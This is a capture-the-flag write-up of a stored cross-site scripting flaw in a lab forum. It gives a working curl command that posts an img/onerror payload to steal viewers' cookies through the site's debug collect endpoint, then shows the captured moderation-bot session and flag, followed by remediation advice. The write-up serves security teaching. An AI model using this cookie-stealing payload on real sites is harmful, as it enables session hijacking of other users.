# Flag 04 — Stored XSS (cookie exfiltration via the moderation bot)

**Flag:** `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`
**Location:** forum comment field (`POST /forum/{thread}/comment`, field `content`); flag delivered in the moderation bot's non-httpOnly `flag` cookie.
**Severity:** Critical
**Class:** Stored cross-site scripting → sensitive cookie theft.

## Discovery

Three facts, all disclosed in source comments and the staff status page, combined into one chain:
- The comment box states "HTML is supported for formatting" and does not escape input → stored XSS.
- A moderation bot "opens every thread with a live session… and a 'flag' cookie that isn't httpOnly".
- `/api/collect?c=` logs whatever is sent to it and returns it on GET → a ready-made exfiltration endpoint.

## Exploitation

1. Post a comment containing a script that sends the viewer's cookies to the collect endpoint:

```bash
TARGET=192.168.1.155
curl -s -i -b jdoe.txt -X POST "http://$TARGET:4942/forum/6viy7xi64gxpan3/comment" \
  --data-urlencode 'content=<img src=x onerror="fetch(`/api/collect?c=${encodeURIComponent(document.cookie)}`)">'
```

2. The moderation bot (a headless Chrome running from `127.0.0.1`) opens the thread and executes the payload. Read the captured data back:

```bash
curl -s "http://$TARGET:4942/api/collect"
# {"captured":[{"data":"session=<bot JWT>; flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}",
#               "from":"127.0.0.1","ua":"...HeadlessChrome/120..."}]}
```

The bot's `flag` cookie — not marked httpOnly, so reachable from `document.cookie` — carries the flag.

## Impact

Any content a user posts runs in the browser of everyone who views it, including an automated privileged reviewer. Because the sensitive cookie is not httpOnly, the script reads and exfiltrates it. In a real platform this is full session hijacking of any viewer, including moderators and admins.

## Remediation

- Escape/encode all user content on output; never render user HTML. If formatting is needed, use a strict allow-list sanitiser (and a Content-Security-Policy that blocks inline/remote script).
- Mark session and other sensitive cookies `HttpOnly` (and `Secure`, `SameSite`) so script cannot read them.
- Remove debug exfil endpoints like `/api/collect` from production.

## Note

The stolen bot session decodes to `{"login":"moderator","role":"student"}` — low privilege, so it does not by itself reach `staff`/`god`. Those accounts are gated behind 42 SSO (separate vector).

## In simple terms

The forum let you post actual web code in a comment, not just plain text. We posted a hidden instruction that says "whoever opens this, secretly send me your login pass." The site has a robot that automatically opens every new comment to review it — and when it opened ours, it obeyed the hidden instruction and leaked its own pass, which contained the flag.

The robot's pass wasn't locked away from scripts (a simple "httpOnly" setting would have hidden it), and the devs left an open debug page that happily stored the stolen data for us to read back. Lesson: letting users post raw HTML isn't a feature — it means their code runs in other people's browsers.
